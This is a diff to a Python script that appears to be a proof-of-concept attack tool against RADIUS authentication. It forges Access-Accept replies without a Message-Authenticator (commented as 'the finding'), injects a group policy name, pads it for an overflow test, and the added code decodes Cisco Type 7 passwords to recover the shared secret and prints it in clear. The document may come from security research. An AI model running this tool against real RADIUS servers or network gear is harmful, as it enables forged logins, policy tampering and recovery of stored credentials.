@@ -32,9 +32,21 @@ import socket
 import struct
 import argparse
 import sys
+import re
 
 
 RADIUS_CODE_ACCESS_ACCEPT = 2
+
+
+def cisco_type7_decode(enc):
+    xlat = [0x64,0x73,0x66,0x64,0x3B,0x6B,0x66,0x38,
+            0x38,0x6C,0x6B,0x38,0x53,0x6B,0x66,0x38]
+    try:
+        seed = int(enc[:2])
+        enc = enc[2:]
+        return "".join(chr(int(enc[i:i+2],16) ^ xlat[(seed+i//2)%16]) for i in range(0,len(enc),2))
+    except Exception as e:
+        sys.exit(f"Type 7 decode error: {e}")
 ATTR_CLASS = 25
 ATTR_MESSAGE_AUTHENTICATOR = 80  # intentionally NOT included — this is the finding
 
@@ -126,7 +138,8 @@ def main():
                       help="Send a single crafted Access-Accept")
 
     ap.add_argument("--port", type=int, default=1812)
-    ap.add_argument("--secret", required=True, help="RADIUS shared secret")
+    ap.add_argument("--secret", required=True,
+                    help="RADIUS shared secret (plaintext or 'type7:<hash>' to auto-decode)")
     ap.add_argument("--policy", required=True,
                     help="Group policy name to inject via OU=. Use --f2 for overflow test.")
     ap.add_argument("--f2", action="store_true",
@@ -140,6 +153,11 @@ def main():
 
     args = ap.parse_args()
 
+    secret = args.secret
+    if secret.lower().startswith("type7:"):
+        secret = cisco_type7_decode(secret[6:])
+        print(f"[*] Type 7 decoded secret: {secret}")
+
     policy = args.policy
     if args.f2:
         policy = (args.policy + "A" * 200)[:200]
@@ -147,11 +165,11 @@ def main():
               f"(extraction cap=256, CLI max=64)")
 
     if args.server:
-        run_server(args.port, args.secret, policy)
+        run_server(args.port, secret, policy)
     else:
         if not args.host or not args.req_auth:
             ap.error("--send requires --host and --request-auth")
-        send_single(args.host, args.port, args.secret, args.req_auth,
+        send_single(args.host, args.port, secret, args.req_auth,
                     args.req_id, policy)
 
 
